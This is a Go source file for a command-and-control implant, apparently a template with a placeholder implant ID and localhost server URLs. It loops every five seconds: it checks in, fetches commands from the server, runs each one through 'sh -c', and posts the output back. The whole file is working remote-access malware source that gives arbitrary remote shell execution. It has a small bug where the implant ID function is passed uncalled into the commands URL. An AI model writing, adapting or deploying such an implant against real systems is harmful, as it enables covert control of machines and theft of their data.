package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os/exec"
	"time"
)

var implantIDData [36]byte

func init() {
	const placeholder = "00000000-0000-0000-0000-000000000000" // len==36
	copy(implantIDData[:], placeholder)
}

func implantID() string {
	return string(implantIDData[:])
}

const (
	checkInURL       = "http://localhost:8080/api/checkin"
	commandsURL      = "http://localhost:8080/implants/%s/commands"
	commandResultURL = "http://localhost:8080/command-result"
	checkInInterval  = 5 * time.Second
)

type Command struct {
	ID      int    `json:"id"`
	Command string `json:"command"`
}

func main() {
	for {
		checkIn()
		fetchAndExecuteCommands()
		time.Sleep(checkInInterval)
	}
}

func checkIn() {

	payload := map[string]string{
		"implant_id": implantID(),
		"ip_address": "192.168.1.100",
	}
	payloadBytes, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("Error marshaling payload:", err)
		return
	}

	resp, err := http.Post(checkInURL, "application/json", bytes.NewBuffer(payloadBytes))
	if err != nil {
		fmt.Println("Error during check-in:", err)
		return
	}
	defer resp.Body.Close()

	fmt.Println("Check-in successful")
}

func fetchAndExecuteCommands() {

	resp, err := http.Get(fmt.Sprintf(commandsURL, implantID))
	if err != nil {
		fmt.Println("Error fetching commands:", err)
		return
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)
		return
	}
	bodyString := string(body)

	fmt.Println("Response Body:", bodyString)

	var response struct {
		Commands []Command `json:"commands"`
	}
	if err := json.Unmarshal(body, &response); err != nil {
		fmt.Println("Error decoding response:", err)
		return
	}

	fmt.Println("Fetched commands:", response.Commands)

	for _, cmd := range response.Commands {
		output := executeCommand(cmd.Command)
		sendOutput(cmd.ID, output)
	}
}

func executeCommand(cmd string) string {
	out, err := exec.Command("sh", "-c", cmd).Output()
	if err != nil {
		return fmt.Sprintf("Error: %v", err)
	}
	return string(out)
}

func sendOutput(commandID int, output string) {

	payload := map[string]interface{}{
		"command_id": commandID,
		"output":     output,
	}
	payloadBytes, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("Error marshaling payload:", err)
		return
	}

	resp, err := http.Post(commandResultURL, "application/json", bytes.NewBuffer(payloadBytes))
	if err != nil {
		fmt.Println("Error sending output:", err)
		return
	}
	defer resp.Body.Close()

	fmt.Printf("Command %d output sent successfully\n", commandID)
}
